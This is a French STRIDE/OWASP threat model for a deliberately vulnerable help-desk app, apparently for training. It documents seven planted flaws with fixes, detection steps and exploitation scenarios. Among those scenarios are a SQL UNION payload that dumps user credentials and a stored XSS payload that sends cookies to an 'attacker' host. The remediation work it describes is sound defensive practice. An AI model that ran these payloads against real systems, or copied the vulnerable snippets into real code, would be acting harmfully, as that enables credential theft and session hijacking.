# SecureDesk — Modèle de Menace & Matrice des Vulnérabilités (STRIDE / OWASP 2025)

**Auteurs** : Rayen Hassen (Lead Sécurité/K8s), Hamza Kalai (Lead Dev/Failles), Oussama Hamada (Lead CI/CD), Aladin Fadhli (Lead Observabilité)  
**Méthodologie** : STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege)  
**Standard** : OWASP Top 10:2025  

---

## 1. Cartographie des Actifs & Surfaces d'Attaque

### 1.1 Actifs Sensibles (Assets)
1. **Identifiants & Secrets** : Mots de passe hashés BCrypt dans la table `users`, credentials de base de données PostgreSQL, tokens d'API, clés de signature de sessions.
2. **Données Métier & Confidentialité** : Tickets de support clients contenant des descriptions d'incidents techniques, informations internes et échanges confidentiels.
3. **Intégrité Applicative & Infrastructure** : Pipeline GitLab CI/CD, registre d'images Docker, cluster Minikube, intégrité du code source.

### 1.2 Surfaces d'Attaque (Attack Surfaces)
- **Point d'entrée Web / HTTP** : Contrôleurs Spring MVC, formulaires Thymeleaf, paramètres de requête (`id`, `search`, `status`).
- **Composants Tiers (Supply Chain)** : Dépendances Maven (`pom.xml`) et images de base conteneurisées.
- **Endpoints de Diagnostic Applicatif** : Spring Boot Actuator (`/actuator/**`).
- **Configuration & Dépôt Git** : Fichiers de configuration (`application.properties`), variables d'environnement, commits Git.
- **Réseau de Conteneurs Kubernetes** : Flux inter-pods (Communication Ingress ➔ Pod App ➔ Pod PostgreSQL).

---

## 2. Modèle de Menace STRIDE

| Menace STRIDE | Risque Identifié sur SecureDesk | Composant Cible | Mitigation Définie |
|:---|:---|:---|:---|
| **S**poofing (Usurpation) | Vol de session ou connexion illégitime par brute-force ou mot de passe faible. | `AuthController` / Spring Security | Mots de passe forts, hachage BCrypt (coût 10), cookies de session `HttpOnly`. |
| **T**ampering (Altération) | Injection XSS modifiant le DOM des agents/admins ou injection de dépendance malveillante. | Commentaires (`Comment`), Dépendances Maven | Échappement `th:text`, scan Trivy en CI, validation d'entrée. |
| **R**epudiation (Répudiation) | Action critique (suppression, modification de ticket, élévation de rôle) sans traçabilité. | Base de données, Logs applicatifs | Logs structurés dans PostgreSQL (`createdAt`, `author`), centralisation des logs dans Loki via Alloy. |
| **I**nformation Disclosure (Divulgation) | Injection SQL exfiltrant la base, IDOR accédant aux tickets d'autrui, Actuator exposant les variables d'environnement. | `TicketService`, `TicketController`, `/actuator` | Requêtes paramétrées JPA, contrôles d'accès contextuels, restriction drastique d'Actuator. |
| **D**enial of Service (Déni de service) | Épuisement des ressources mémoire/CPU par requêtes abusives ou memory dump. | JVM, Kubernetes Pods | Quotas de ressources `requests` / `limits` Kubernetes, désactivation de `/actuator/heapdump`. |
| **E**levation of Privilege (Élévation de privilèges) | Accès direct aux URL `/admin/**` par un client non autorisé. | `AdminController` | Filtrage strict Spring Security (`hasRole('ADMIN')`) + `@PreAuthorize`. |

---

## 3. Fiches Détaillées des 7 Vulnérabilités (V1 à V7)

---

### Fiche V1 — Injection SQL (SQLi)
- **Identifiant** : `V1`
- **Catégorie OWASP 2025** : `A05:2025 – Injection`
- **Menace STRIDE** : Information Disclosure / Tampering
- **Composant ciblé** : Recherche de tickets (`GET /agent/search?query=...`) dans `TicketRepository` ou `TicketService`.
- **Cause Technique** : Concaténation dynamique de chaînes dans une requête native SQL ou JPQL sans passage par paramètres préparés :
  ```java
  // Code vulnérable :
  String sql = "SELECT * FROM tickets WHERE title LIKE '%" + query + "%'";
  entityManager.createNativeQuery(sql);
  ```
- **Scénario d'Exploitation** : Payload `' UNION SELECT null, username, password, email, null, null, null FROM users --` permettant à un attaquant de dumper la table des utilisateurs.
- **Détection Automatisée** : 
  - **SAST (Semgrep)** : Règle Java SQL Injection (`ERROR`).
  - **DAST (OWASP ZAP)** : Test d'injection SQL actif sur le paramètre `query`.
- **Remédiation** : Utilisation de requêtes paramétrées Spring Data JPA :
  ```java
  // Code corrigé :
  @Query("SELECT t FROM Ticket t WHERE LOWER(t.title) LIKE LOWER(CONCAT('%', :query, '%'))")
  List<Ticket> searchByTitle(@Param("query") String query);
  ```
- **Preuve Requise** : Capture ZAP/Burp avec résultat de l'injection avant correctif / Réponse sécurisée sans injection après correctif + scan Semgrep vert.

---

### Fiche V2 — Cross-Site Scripting Stocké (Stored XSS)
- **Identifiant** : `V2`
- **Catégorie OWASP 2025** : `A05:2025 – Injection`
- **Menace STRIDE** : Tampering / Information Disclosure
- **Composant ciblé** : Affichage des commentaires de tickets dans la vue `ticket/detail.html`.
- **Cause Technique** : Utilisation de l'attribut non échappé de Thymeleaf :
  ```html
  <!-- Code vulnérable : -->
  <div th:utext="${comment.content}"></div>
  ```
- **Scénario d'Exploitation** : Injection d'un payload `<script>fetch('http://attacker/?c='+document.cookie)</script>` ou d'une balise `<img>` piégée lors de l'ajout d'un commentaire, déclenché à l'ouverture par l'agent support.
- **Détection Automatisée** :
  - **SAST (Semgrep)** : Détection de l'utilisation non sécurisée de `th:utext` dans les templates.
  - **DAST (OWASP ZAP)** : Détection d'alerte XSS active.
- **Remédiation** : Utilisation exclusive de l'échappement HTML automatique :
  ```html
  <!-- Code corrigé : -->
  <div th:text="${comment.content}"></div>
  ```
- **Preuve Requise** : Alerte pop-up / injection visible dans le DOM avant correctif / Caractères encodés `&lt;script&gt;` et rapport ZAP sans alerte après correctif.

---

### Fiche V3 — Référence Directe Non Sécurisée à un Objet (IDOR)
- **Identifiant** : `V3`
- **Catégorie OWASP 2025** : `A01:2025 – Broken Access Control`
- **Menace STRIDE** : Information Disclosure
- **Composant ciblé** : Consultation d'un ticket (`GET /tickets/{id}`) dans `TicketController`.
- **Cause Technique** : Le contrôleur charge le ticket par son ID sans vérifier si l'utilisateur authentifié est l'auteur (`createdBy`), l'agent assigné, ou un administrateur.
- **Scénario d'Exploitation** : Le client `client1` accède à `http://securedesk.local/tickets/42` appartenant à `client2` et lit des données confidentielles.
- **Détection Automatisée** : Test d'intrusion manuel / Scénario automatisé curl / intégration postman.
- **Remédiation** : Vérification d'autorisation systématique au niveau du service :
  ```java
  // Code corrigé :
  if (!user.getRole().equals(Role.ROLE_ADMIN) && 
      !user.getRole().equals(Role.ROLE_AGENT) && 
      !ticket.getCreatedBy().getId().equals(user.getId())) {
      throw new AccessDeniedException("Accès non autorisé à ce ticket");
  }
  ```
- **Preuve Requise** : Réponse HTTP 200 sur le ticket d'un tiers avant correctif / Réponse HTTP 403 Forbidden après correctif.

---

### Fiche V4 — Panneau Admin Non Protégé (Bypass Authorization)
- **Identifiant** : `V4`
- **Catégorie OWASP 2025** : `A01:2025 – Broken Access Control`
- **Menace STRIDE** : Elevation of Privilege
- **Composant ciblé** : Route administrative `/admin/**` (ex. `/admin/users` ou `/admin/dashboard`).
- **Cause Technique** : La route `/admin/**` est omise du menu visuel pour les clients mais n'est pas restreinte dans la `SecurityFilterChain` (`permitAll()`), ou absence de contrôle d'autorisation au niveau de la méthode du contrôleur.
- **Scénario d'Exploitation** : Un client non privilégié tape manuellement l'URL `http://securedesk.local/admin/users` et obtient l'écran de modification des rôles.
- **Détection Automatisée** : Test manuel de fuzzing d'endpoints / Vérification par script d'intégration.
- **Remédiation** : Règle stricte dans `SecurityConfig.java` et annotation de sécurité :
  ```java
  // Code corrigé :
  .requestMatchers("/admin/**").hasRole("ADMIN")
  // Et sur la classe / méthode :
  @PreAuthorize("hasRole('ADMIN')")
  ```
- **Preuve Requise** : Accès direct affichant l'interface d'administration avant correctif / Redirection vers `/login` ou code HTTP 403 Access Denied après correctif.

---

### Fiche V5 — Secret Exposé dans le Dépôt (Hardcoded Secrets)
- **Identifiant** : `V5`
- **Catégorie OWASP 2025** : `A07:2025 – Identification and Authentication Failures`
- **Menace STRIDE** : Information Disclosure
- **Composant ciblé** : Fichier `application.properties` ou commit Git.
- **Cause Technique** : Présence d'un mot de passe de base de données, clé API ou token JWT de test directement écrit en dur dans le code source commité.
- **Scénario d'Exploitation** : Un tiers ayant accès au dépôt Git récupère les identifiants pour se connecter directement à la base de données PostgreSQL ou aux services d'intégration.
- **Détection Automatisée** : **Gitleaks** exécuté en pre-commit local et en stage `secrets` du pipeline GitLab CI.
- **Remédiation** : Remplacement des secrets en dur par des variables d'environnement Spring Boot (`${DB_PASSWORD}`) et masquage dans GitLab CI Variables / Kubernetes Secrets. Nettoyage de l'historique Git si nécessaire.
- **Preuve Requise** : Rapport Gitleaks bloquant le pipeline CI avec code retour `1` / Pipeline vert une fois le secret externalisé.

---

### Fiche V6 — Dépendance Vulnérable (Vulnerable Third-Party Component)
- **Identifiant** : `V6`
- **Catégorie OWASP 2025** : `A03:2025 – Software and Data Integrity Failures (Supply Chain)`
- **Menace STRIDE** : Tampering / Denial of Service
- **Composant ciblé** : Fichier `pom.xml` Maven.
- **Cause Technique** : Déclaration intentionnelle d'une bibliothèque open-source contenant une CVE critique documentée (ex. bibliothèque JSON ou XML non patchée).
- **Scénario d'Exploitation** : Exploitation d'une désérialisation ou d'un bug de traitement mémoire via la bibliothèque tiers obsolète.
- **Détection Automatisée** : **Trivy** (mode filesystem `trivy fs .`) lors du stage `deps` du pipeline GitLab CI.
- **Remédiation** : Mise à jour de la dépendance dans `pom.xml` vers une version récente ne présentant plus la vulnérabilité.
- **Preuve Requise** : Rapport Trivy listant la CVE avec niveau `CRITICAL` et échec du pipeline / Rapport Trivy avec 0 CVE critique et passage du stage.

---

### Fiche V7 — Endpoints Spring Boot Actuator Exposés
- **Identifiant** : `V7`
- **Catégorie OWASP 2025** : `A02:2025 – Security Misconfiguration`
- **Menace STRIDE** : Information Disclosure
- **Composant ciblé** : Endpoints `/actuator/env`, `/actuator/heapdump`, `/actuator/beans`.
- **Cause Technique** : Configuration permissive dans `application.properties` :
  ```properties
  management.endpoints.web.exposure.include=*
  ```
- **Scénario d'Exploitation** : L'attaquant consulte `http://securedesk.local/actuator/env` pour lire l'environnement système et les propriétés injectées, ou télécharge `heapdump` pour extraire des tokens et données utilisateurs de la mémoire de la JVM.
- **Détection Automatisée** : Scan DAST (OWASP ZAP) / Scan de configuration Trivy.
- **Remédiation** : Exposition sélective minimale et restriction d'accès aux seuls administrateurs :
  ```properties
  management.endpoints.web.exposure.include=health,info
  management.endpoint.health.show-details=when-authorized
  ```
- **Preuve Requise** : Téléchargement du heapdump / lecture des variables d'environnement avant correctif / Endpoints inaccessibles (HTTP 404 / 401) après correctif.

